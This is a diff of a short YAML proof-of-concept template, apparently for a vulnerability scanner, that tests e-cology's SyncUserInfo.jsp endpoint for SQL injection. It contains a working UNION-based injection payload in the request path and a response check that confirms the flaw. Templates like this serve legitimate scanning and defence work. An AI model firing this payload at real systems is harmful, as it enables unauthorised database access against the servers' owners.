@@ -2,10 +2,10 @@ name: poc-yaml-ecology-sqli
 rules:
   - method: GET
     path: >-
-      /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(12333*100),null
+      /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(999*999),null
     follow_redirects: true
     expression: |
-      status==200 && body.bcontains(b"1233300")
+      status == 200 && body.bcontains(b"998001")
 detail:
   author: MaxSecurity(https://github.com/MaxSecurity)
   links:
